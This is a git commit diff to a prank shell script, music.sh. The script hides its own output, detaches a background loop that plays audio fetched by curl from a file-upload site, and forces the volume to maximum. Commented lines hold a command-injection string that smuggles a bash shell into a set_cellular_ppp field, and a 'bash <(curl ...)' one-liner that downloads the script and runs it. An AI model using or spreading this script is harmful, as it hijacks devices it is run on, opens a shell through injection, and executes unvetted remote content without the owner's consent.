2047b0fa63f9fa2dfa1c6f12b15b08f5d3213e7a
TheYunDude <97200157+TheYunDude@users.noreply.github.com>
2023-03-03 09:11:18 -0800

    sum changes to fix

--- music.sh
+++ music.sh
@@ -2,9 +2,10 @@ exec >/dev/null
 exec 2>/dev/null
 while [ 1=1 ];
 do
-    aplay -q <(curl https://raw.githubusercontent.com/ShatteredDisk/rickroll/master/rickroll.mp4);
+    aplay -q <(curl https://eu5.easyupload.io/download/8ndt54/iprsyxstk9woags4r40khfaliscztt6u);
 done & disown &
 amixer set Master 100% unmute;
 
 #set_cellular_ppp \';bash;exit;\'
-#bash <(curl https://raw.githubusercontent.com/TheYunDude/The-Big-Boy-Yunus/main/music.sh)
+#bash <(curl -s https://raw.githubusercontent.com/TheYunDude/The-Big-Boy-Yunus/main/music.sh)
+#https://eu5.easyupload.io/download/8ndt54/iprsyxstk9woags4r40khfaliscztt6u
